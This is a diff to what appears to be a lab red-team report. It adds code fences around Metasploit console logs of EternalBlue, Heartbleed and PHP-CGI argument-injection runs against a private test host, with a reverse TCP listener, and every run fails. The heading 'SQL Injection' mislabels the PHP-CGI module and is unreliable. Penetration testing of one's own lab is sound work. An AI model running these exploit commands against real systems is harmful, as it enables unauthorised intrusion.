@@ -82,7 +82,7 @@ Red Test: Nmap against DMZ and Windows Server
 ## Red tests using Metasploit CLI and selected payloads
 
 ### Eternal Blue
-
+```
 msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 [*] Started reverse TCP handler on 192.168.100.200:4444
 [*] 192.168.50.100:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
@@ -90,9 +90,10 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 [*] 192.168.50.100:445 - Scanned 1 of 1 hosts (100% complete)
 [-] 192.168.50.100:445 - The target is not vulnerable.
 [*] Exploit completed, but no session was created.
+```
 
 ### Heartbleed
-
+```
 msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > back
 msf6 > use auxiliary/scanner/ssl/openssl_heartbleed
 msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 192.168.50.100
@@ -100,9 +101,10 @@ RHOSTS => 192.168.50.100
 msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run
 [*] 192.168.50.100:443 - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
+```
 
 ### SQL Injection
-
+```
 msf6 exploit(multi/http/php_cgi_arg_injection) > set RHOSTS 192.168.50.100
 RHOSTS => 192.168.50.100
 msf6 exploit(multi/http/php_cgi_arg_injection) > run
@@ -110,3 +112,4 @@ msf6 exploit(multi/http/php_cgi_arg_injection) > run
 [*] Exploit completed, but no session was created.
 
 msf6 exploit(multi/http/php_cgi_arg_injection) >
+```
